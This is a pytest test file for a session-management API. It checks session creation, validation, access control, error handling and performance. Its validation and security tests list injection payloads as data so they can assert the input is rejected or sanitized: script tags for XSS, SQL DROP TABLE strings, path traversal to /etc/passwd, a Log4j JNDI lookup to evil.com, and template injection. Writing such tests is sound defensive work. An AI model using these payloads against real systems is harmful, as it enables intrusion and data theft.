"""
Tests for session management API endpoints.
Focus on identifying root causes of "start new session" button errors.
"""

import pytest
import asyncio
from httpx import AsyncClient
from unittest.mock import patch, MagicMock
from datetime import datetime
from uuid import uuid4


class TestSessionCreation:
    """Test session creation functionality - Critical for debugging button error."""

    async def test_create_session_success(self, async_client: AsyncClient, mock_user_headers, sample_session_data):
        """Test successful session creation with valid data."""
        response = await async_client.post("/api/sessions", json=sample_session_data, headers=mock_user_headers)
        
        assert response.status_code == 201
        data = response.json()
        
        # Verify response structure
        assert "session_id" in data
        assert "status" in data
        assert "created_at" in data
        assert data["session_name"] == sample_session_data["session_name"]
        assert data["status"] == "idle"
        
        # Verify session_id is a valid UUID
        import uuid
        uuid.UUID(data["session_id"])  # Should not raise exception
        
        # Verify created_at is a valid timestamp
        datetime.fromisoformat(data["created_at"].replace("Z", "+00:00"))

    async def test_create_session_missing_name(self, async_client: AsyncClient, mock_user_headers):
        """Test session creation fails with missing session name."""
        invalid_data = {
            "processing_options": {
                "validation_enabled": True,
            }
            # Missing session_name
        }
        
        response = await async_client.post("/api/sessions", json=invalid_data, headers=mock_user_headers)
        
        assert response.status_code == 400
        data = response.json()
        assert "detail" in data
        assert "session_name" in data["detail"].lower()

    async def test_create_session_empty_name(self, async_client: AsyncClient, mock_user_headers):
        """Test session creation fails with empty session name."""
        invalid_data = {
            "session_name": "",
            "processing_options": {}
        }
        
        response = await async_client.post("/api/sessions", json=invalid_data, headers=mock_user_headers)
        
        assert response.status_code == 400

    async def test_create_session_whitespace_name(self, async_client: AsyncClient, mock_user_headers):
        """Test session creation fails with whitespace-only name."""
        invalid_data = {
            "session_name": "   \n\t  ",
            "processing_options": {}
        }
        
        response = await async_client.post("/api/sessions", json=invalid_data, headers=mock_user_headers)
        
        assert response.status_code == 400

    async def test_create_session_duplicate_name(self, async_client: AsyncClient, mock_user_headers, sample_session_data):
        """Test session creation fails with duplicate name."""
        # Create first session
        response1 = await async_client.post("/api/sessions", json=sample_session_data, headers=mock_user_headers)
        assert response1.status_code == 201
        
        # Try to create second session with same name
        response2 = await async_client.post("/api/sessions", json=sample_session_data, headers=mock_user_headers)
        assert response2.status_code == 409  # Conflict
        
        data = response2.json()
        assert "already exists" in data["detail"].lower()

    async def test_create_session_long_name(self, async_client: AsyncClient, mock_user_headers):
        """Test session creation with name exceeding maximum length."""
        long_name_data = {
            "session_name": "a" * 101,  # Assuming 100 char limit
            "processing_options": {}
        }
        
        response = await async_client.post("/api/sessions", json=long_name_data, headers=mock_user_headers)
        
        # Should either succeed with truncated name or fail with validation error
        assert response.status_code in [201, 400]

    async def test_create_session_xss_protection(self, async_client: AsyncClient, mock_user_headers):
        """Test session creation sanitizes malicious input."""
        xss_data = {
            "session_name": '<script>alert("xss")</script>Test Session',
            "processing_options": {}
        }
        
        response = await async_client.post("/api/sessions", json=xss_data, headers=mock_user_headers)
        
        if response.status_code == 201:
            data = response.json()
            # Name should be sanitized
            assert "<script>" not in data["session_name"]
        else:
            # Or rejected entirely
            assert response.status_code == 400

    async def test_create_session_without_auth(self, async_client: AsyncClient, sample_session_data):
        """Test session creation requires authentication."""
        # Request without auth headers
        response = await async_client.post("/api/sessions", json=sample_session_data)
        
        # Should require authentication
        assert response.status_code in [401, 403]

    async def test_create_session_malformed_json(self, async_client: AsyncClient, mock_user_headers):
        """Test session creation handles malformed JSON gracefully."""
        response = await async_client.post(
            "/api/sessions",
            content='{"session_name": "test", "processing_options": {',  # Malformed JSON
            headers={**mock_user_headers, "Content-Type": "application/json"}
        )
        
        assert response.status_code == 422  # Unprocessable Entity

    async def test_create_session_invalid_processing_options(self, async_client: AsyncClient, mock_user_headers):
        """Test session creation handles invalid processing options."""
        invalid_data = {
            "session_name": "Test Session",
            "processing_options": {
                "validation_enabled": "not a boolean",
                "invalid_option": True
            }
        }
        
        response = await async_client.post("/api/sessions", json=invalid_data, headers=mock_user_headers)
        
        # Should either sanitize options or return validation error
        assert response.status_code in [201, 400, 422]


class TestSessionRetrieval:
    """Test session retrieval and listing functionality."""

    async def test_get_session_success(self, async_client: AsyncClient, mock_user_headers, sample_session_data):
        """Test retrieving an existing session."""
        # Create session first
        create_response = await async_client.post("/api/sessions", json=sample_session_data, headers=mock_user_headers)
        assert create_response.status_code == 201
        session_id = create_response.json()["session_id"]
        
        # Retrieve session
        get_response = await async_client.get(f"/api/sessions/{session_id}", headers=mock_user_headers)
        
        assert get_response.status_code == 200
        data = get_response.json()
        
        assert data["session_id"] == session_id
        assert data["session_name"] == sample_session_data["session_name"]

    async def test_get_session_not_found(self, async_client: AsyncClient, mock_user_headers):
        """Test retrieving non-existent session."""
        fake_session_id = str(uuid4())
        
        response = await async_client.get(f"/api/sessions/{fake_session_id}", headers=mock_user_headers)
        
        assert response.status_code == 404

    async def test_get_session_invalid_uuid(self, async_client: AsyncClient, mock_user_headers):
        """Test retrieving session with invalid UUID format."""
        invalid_id = "not-a-uuid"
        
        response = await async_client.get(f"/api/sessions/{invalid_id}", headers=mock_user_headers)
        
        assert response.status_code in [400, 422]  # Bad Request or Unprocessable Entity

    async def test_list_sessions(self, async_client: AsyncClient, mock_user_headers):
        """Test listing sessions."""
        response = await async_client.get("/api/sessions", headers=mock_user_headers)
        
        assert response.status_code == 200
        data = response.json()
        
        assert "sessions" in data
        assert isinstance(data["sessions"], list)

    async def test_list_sessions_with_filters(self, async_client: AsyncClient, mock_user_headers, sample_session_data):
        """Test listing sessions with query filters."""
        # Create a session first
        await async_client.post("/api/sessions", json=sample_session_data, headers=mock_user_headers)
        
        # Test various filter parameters
        test_params = [
            {"status": "idle"},
            {"recent": "true"},
            {"limit": "5"},
            {"status": "completed,idle"},
        ]
        
        for params in test_params:
            response = await async_client.get("/api/sessions", params=params, headers=mock_user_headers)
            assert response.status_code == 200


class TestSessionErrorHandling:
    """Test error handling in session management - Key for debugging."""

    async def test_database_connection_error(self, async_client: AsyncClient, mock_user_headers, sample_session_data):
        """Test handling of database connection errors."""
        with patch("app.database.get_async_db") as mock_db:
            mock_db.side_effect = Exception("Database connection failed")
            
            response = await async_client.post("/api/sessions", json=sample_session_data, headers=mock_user_headers)
            
            assert response.status_code == 500
            data = response.json()
            assert "detail" in data

    async def test_concurrent_session_creation(self, async_client: AsyncClient, mock_user_headers):
        """Test concurrent session creation with same name."""
        session_data = {
            "session_name": "Concurrent Test Session",
            "processing_options": {}
        }
        
        # Create multiple sessions concurrently with same name
        tasks = [
            async_client.post("/api/sessions", json=session_data, headers=mock_user_headers)
            for _ in range(3)
        ]
        
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Should have one success and others as conflicts
        success_count = sum(1 for r in responses if hasattr(r, 'status_code') and r.status_code == 201)
        conflict_count = sum(1 for r in responses if hasattr(r, 'status_code') and r.status_code == 409)
        
        assert success_count == 1
        assert conflict_count >= 1

    async def test_session_creation_timeout(self, async_client: AsyncClient, mock_user_headers, sample_session_data):
        """Test session creation with simulated timeout."""
        with patch("app.api.sessions.create_session") as mock_create:
            # Simulate slow database operation
            async def slow_create(*args, **kwargs):
                await asyncio.sleep(2)  # Simulate slow operation
                raise Exception("Operation timed out")
            
            mock_create.side_effect = slow_create
            
            response = await async_client.post("/api/sessions", json=sample_session_data, headers=mock_user_headers)
            
            assert response.status_code >= 500

    async def test_memory_pressure_handling(self, async_client: AsyncClient, mock_user_headers):
        """Test session creation under memory pressure."""
        # Create many sessions to simulate memory pressure
        sessions_created = 0
        max_attempts = 50
        
        for i in range(max_attempts):
            session_data = {
                "session_name": f"Memory Test Session {i}",
                "processing_options": {}
            }
            
            response = await async_client.post("/api/sessions", json=session_data, headers=mock_user_headers)
            
            if response.status_code == 201:
                sessions_created += 1
            elif response.status_code >= 500:
                # Server error due to resource constraints
                break
            
            # Small delay to prevent overwhelming
            await asyncio.sleep(0.01)
        
        # Should create at least some sessions successfully
        assert sessions_created > 0


class TestSessionValidation:
    """Test input validation and sanitization."""

    @pytest.mark.parametrize("session_name,expected_status", [
        ("Valid Session Name", 201),
        ("", 400),
        ("   ", 400),
        ("\n\t\r", 400),
        ("Valid-Name_123", 201),
        ("Name with (parentheses) and [brackets]", 201),
        ("Name with émojis 🚀", 201),
        ("A" * 50, 201),  # Reasonable length
        ("A" * 200, 400),  # Too long
        ("../../etc/passwd", 400),  # Path traversal attempt
        ("DROP TABLE sessions; --", 400),  # SQL injection attempt
    ])
    async def test_session_name_validation(self, async_client: AsyncClient, mock_user_headers, session_name, expected_status):
        """Test various session name validation scenarios."""
        session_data = {
            "session_name": session_name,
            "processing_options": {}
        }
        
        response = await async_client.post("/api/sessions", json=session_data, headers=mock_user_headers)
        
        assert response.status_code == expected_status

    async def test_unicode_handling(self, async_client: AsyncClient, mock_user_headers):
        """Test proper Unicode handling in session names."""
        unicode_names = [
            "测试会话",  # Chinese
            "Тестовая сессия",  # Russian
            "جلسة اختبار",  # Arabic
            "🚀 Space Session 🛸",  # Emojis
            "Café Session ñoño",  # Accented characters
        ]
        
        for name in unicode_names:
            session_data = {
                "session_name": name,
                "processing_options": {}
            }
            
            response = await async_client.post("/api/sessions", json=session_data, headers=mock_user_headers)
            
            # Should either succeed or fail gracefully
            assert response.status_code in [201, 400]
            
            if response.status_code == 201:
                # Verify the name is stored correctly
                session_id = response.json()["session_id"]
                get_response = await async_client.get(f"/api/sessions/{session_id}", headers=mock_user_headers)
                assert get_response.status_code == 200
                assert get_response.json()["session_name"] == name


class TestSessionSecurity:
    """Test security aspects of session management."""

    async def test_session_access_control(self, async_client: AsyncClient):
        """Test that sessions have proper access control."""
        # Test without authentication
        response = await async_client.get("/api/sessions")
        assert response.status_code in [401, 403]
        
        # Test with invalid auth
        invalid_headers = {"x-dev-user": "nonexistentuser"}
        response = await async_client.get("/api/sessions", headers=invalid_headers)
        assert response.status_code in [401, 403, 200]  # Depends on auth implementation

    async def test_session_isolation(self, async_client: AsyncClient, sample_session_data):
        """Test that sessions are properly isolated between users."""
        user1_headers = {"x-dev-user": "user1", "Content-Type": "application/json"}
        user2_headers = {"x-dev-user": "user2", "Content-Type": "application/json"}
        
        # User 1 creates a session
        session_data_1 = {**sample_session_data, "session_name": "User 1 Session"}
        response1 = await async_client.post("/api/sessions", json=session_data_1, headers=user1_headers)
        
        if response1.status_code == 201:
            session_id = response1.json()["session_id"]
            
            # User 2 tries to access User 1's session
            response2 = await async_client.get(f"/api/sessions/{session_id}", headers=user2_headers)
            
            # Should be forbidden or not found
            assert response2.status_code in [403, 404]

    async def test_input_sanitization(self, async_client: AsyncClient, mock_user_headers):
        """Test that dangerous input is properly sanitized."""
        dangerous_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE sessions; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",  # Log4j style injection
            "{{7*7}}",  # Template injection
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
        ]
        
        for dangerous_input in dangerous_inputs:
            session_data = {
                "session_name": f"Test {dangerous_input}",
                "processing_options": {}
            }
            
            response = await async_client.post("/api/sessions", json=session_data, headers=mock_user_headers)
            
            if response.status_code == 201:
                # Verify the dangerous content was sanitized
                session_name = response.json().get("session_name", "")
                assert dangerous_input not in session_name
                
                # Check when retrieving the session
                session_id = response.json()["session_id"]
                get_response = await async_client.get(f"/api/sessions/{session_id}", headers=mock_user_headers)
                if get_response.status_code == 200:
                    retrieved_name = get_response.json().get("session_name", "")
                    assert dangerous_input not in retrieved_name


class TestSessionPerformance:
    """Test performance aspects of session management."""

    async def test_session_creation_performance(self, async_client: AsyncClient, mock_user_headers):
        """Test session creation performance."""
        import time
        
        times = []
        for i in range(10):
            session_data = {
                "session_name": f"Performance Test Session {i}",
                "processing_options": {}
            }
            
            start_time = time.time()
            response = await async_client.post("/api/sessions", json=session_data, headers=mock_user_headers)
            end_time = time.time()
            
            if response.status_code == 201:
                times.append(end_time - start_time)
        
        if times:
            avg_time = sum(times) / len(times)
            # Session creation should be reasonably fast (under 1 second)
            assert avg_time < 1.0
            
            # No single request should take too long
            assert max(times) < 5.0

    async def test_concurrent_session_operations(self, async_client: AsyncClient, mock_user_headers):
        """Test handling of concurrent session operations."""
        # Create multiple sessions concurrently
        tasks = []
        for i in range(20):
            session_data = {
                "session_name": f"Concurrent Session {i}",
                "processing_options": {}
            }
            task = async_client.post("/api/sessions", json=session_data, headers=mock_user_headers)
            tasks.append(task)
        
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Count successful responses
        success_count = sum(
            1 for r in responses 
            if hasattr(r, 'status_code') and r.status_code == 201
        )
        
        # Most should succeed (allowing for some conflicts due to timing)
        assert success_count >= 15